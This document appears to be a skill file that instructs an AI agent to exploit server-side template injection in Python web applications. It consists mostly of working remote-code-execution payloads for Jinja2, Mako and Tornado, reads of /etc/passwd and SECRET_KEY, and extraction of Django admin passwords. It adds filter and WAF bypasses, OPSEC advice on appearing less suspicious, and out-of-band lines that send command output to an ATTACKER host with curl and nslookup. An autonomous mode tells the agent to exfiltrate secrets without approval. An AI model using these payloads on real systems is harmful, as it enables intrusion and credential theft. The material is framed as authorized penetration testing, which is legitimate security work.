---
name: ssti-jinja2
description: >
  Guide Jinja2/Python server-side template injection exploitation during
  authorized penetration testing.
keywords:
  - Jinja2 SSTI
  - Flask SSTI
  - Python template injection
  - "{{7*'7'}} returns 7777777"
  - Mako SSTI
  - Tornado template injection
  - Django template injection
  - sandbox escape Jinja2
  - __class__.__mro__
  - Python sandbox bypass
tools:
  - burpsuite
  - sstimap
  - tplmap
  - fenjing
opsec: medium
---

# Jinja2 / Python SSTI

You are helping a penetration tester exploit server-side template injection in a
Python application. The target uses Jinja2 (Flask), Mako, Tornado, or Django
templates and processes attacker-controlled input through the template engine
without proper sanitization. The goal is to escalate from template expression
evaluation to remote code execution, file access, or secret extraction. All
testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Identify the engine, confirm code execution,
  demonstrate RCE, exfiltrate secrets. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  RCE achieved, data extracted, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] ssti-jinja2 → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `ssti-jinja2-rce-output.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[ssti-jinja2] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] ssti-jinja2 → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Confirmed template expression evaluation: `{{7*7}}` returns `49`
- If `{{7*'7'}}` returns `7777777`, the engine is Jinja2. If it returns `49`,
  route to **ssti-twig**.
- If `${7*7}` works but `{{7*7}}` does not, check for Mako (`${ }` syntax).
- If `{% import os %}{{os.system('id')}}` works directly, the engine is Tornado.

## Step 1: Assess

If not already provided, determine:
1. **Framework** — Flask, Django, Tornado, or custom (check error pages, headers)
2. **Template engine** — Jinja2, Mako, Tornado, Django Templates
3. **Injection point** — URL param, form field, header, filename, etc.
4. **Sandbox restrictions** — Are `_`, `.`, `[]`, `|`, `{{` filtered?

Skip if context was already provided.

## Step 2: Engine Identification

### Jinja2 (Flask)

```python
{{7*7}}         # 49
{{7*'7'}}       # 7777777 (string repetition = Jinja2)
{{config}}      # Flask config object (SECRET_KEY, DB credentials)
{{request}}     # Flask request object
```

### Mako

```python
${7*7}          # 49 (uses ${ } syntax)
<%import os%>${os.popen('id').read()}  # Direct Python execution
```

### Tornado

```python
{{7*7}}         # 49
{%import os%}{{os.system('id')}}   # Direct import
```

### Django Templates

```python
{{7*7}}                              # Error (Django doesn't evaluate expressions)
{% csrf_token %}                     # Works in Django, errors in Jinja2
{% debug %}                          # Dumps context variables
{{ messages.storages.0.signer.key }} # Leaks SECRET_KEY
```

## Step 3: Information Extraction (Jinja2/Flask)

### Dump Configuration

```python
{{ config.items() }}
{{ config['SECRET_KEY'] }}
{{ config['SQLALCHEMY_DATABASE_URI'] }}
```

### Dump All Available Context

```python
{% debug %}
{{ self.__dict__ }}
{{ request.environ }}
{{ request.application.__self__._get_data_for_json.__globals__ }}
```

### Read Files (via Flask helpers)

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

## Step 4: RCE — Jinja2

### Shortest Known Payload (lipsum)

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

### Context-Free Payloads (no __builtins__ needed)

These work in any Jinja2 template — no Flask-specific objects required:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### Classic __builtins__ Chain

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### MRO Chain (subclass walk — index varies per Python version)

```python
# Find subprocess.Popen index
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Execute (index 396 is an example — varies per environment)
{{ ''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
```

### Without Guessing Subclass Index

```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen('id').read() }}
  {% endif %}
{% endfor %}
```

### Parameterized via GET (command in `?input=id`)

```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen(request.args.input).read() }}
  {% endif %}
{% endfor %}
```

### Blind RCE (force output via Flask hooks)

```python
{{ x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
") }}
```

## Step 5: RCE — Other Python Engines

### Mako

Direct Python execution — no sandbox to escape:

```python
<%import os%>${os.popen('id').read()}

# Context-free (shorter)
${self.module.cache.util.os.popen('id').read()}
${self.module.runtime.util.os.popen('id').read()}
```

### Tornado

```python
{% import os %}{{ os.popen('id').read() }}
```

### Django Templates (limited — no direct code execution)

Impact is usually limited to information disclosure:

```python
{% debug %}                              # Dump context
{{ messages.storages.0.signer.key }}     # SECRET_KEY
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
  {{ e.user.get_username }} : {{ e.user.password }}
{% endfor %}                             # Admin credentials
```

## Step 6: Filter Bypass (Jinja2)

### Underscore (`_`) Blocked

```python
{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
{{ request|attr(["_"*2,"class","_"*2]|join) }}
```

### Dot (`.`) Blocked

```python
{{ request['__class__']['__mro__'][1] }}
{{ request|attr('__class__')|attr('__mro__')|last }}
```

### Brackets (`[]`) Blocked

```python
{{ request|attr(request.args.getlist(request.args.l)|join) }}
# URL: ?l=a&a=_&a=_&a=class&a=_&a=_
```

### Quotes Blocked

Use request parameters or hex escapes:
```python
{{ request|attr(request.args.a) }}  # ?a=__class__
```

### Most Common Filters Bypass (`._|[]`)

```python
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

### Without `{{ }}` (use `{% %}` blocks)

```python
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()%}{%print(a)%}{%endwith%}
```

## Step 7: Blind / Error-Based / Time-Based SSTI

When output is not directly visible:

### Error-Based

```python
{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }}
```

### Boolean-Based

```python
{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }}
```

### Time-Based

```python
{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}
```

### OOB (DNS / HTTP callback)

```python
{{ cycler.__init__.__globals__.os.popen('curl https://ATTACKER/?data=$(id|base64)').read() }}
{{ cycler.__init__.__globals__.os.popen('nslookup $(id|base64).ATTACKER.oastify.com').read() }}
```

## Step 8: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Got RCE**: Establish reverse shell, route to privesc discovery
- **Got SECRET_KEY**: Forge Flask session cookies (`flask-unsign`)
- **Got DB credentials**: Direct database access, dump users/data
- **Reflected but not stored**: One-time execution — chain with SSRF or XSS
- **Limited to info disclosure**: Extract secrets, API keys, internal URLs
- **Found SQLi in the same app**: Route to **sql-injection-error** or **sql-injection-union**
- **Admin panel found**: Route to **xss-stored** for privilege escalation

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: confirmed engine, injection point, working payload,
filter restrictions, current mode.

## OPSEC Notes

- SSTI payloads execute server-side — they appear in application logs
- `os.popen()` and `subprocess.Popen()` create process artifacts
- Large MRO traversal payloads may trigger WAF rules
- Use `lipsum` or `cycler` payloads (shorter, less suspicious) over MRO chains
- Cleanup: no persistent artifacts unless you wrote files

## Troubleshooting

### Payload Returns Empty or Error

- Check if the application uses `autoescape=True` — try `|safe` filter
- Subclass index (e.g., `[396]`) varies per Python version — use the `warning`
  loop instead of hardcoding indices
- Jinja2 sandbox may be enabled — try context-free payloads (`cycler`, `lipsum`)

### WAF Blocking Payloads

- Use `\x5f\x5f` instead of `__`
- Use `|attr()` instead of dot notation
- Pass sensitive strings via request parameters (`request.args.cmd`)
- Try Fenjing for automated WAF bypass: `python -m fenjing crack --url URL --method GET --inputs name`

### Automated Tools

```bash
# SSTImap — automatic SSTI detection and exploitation
python3 sstimap.py -u 'https://TARGET/page?name=test' -s

# tplmap — older but still useful
python2.7 tplmap.py -u 'https://TARGET/page?name=test*' --os-shell

# TInjA — polyglot-based SSTI scanner
tinja url -u "https://TARGET/page?name=test"

# Fenjing — Jinja2 filter bypass specialist (CTF-focused)
python -m fenjing crack --url 'https://TARGET/' --method GET --inputs name
```
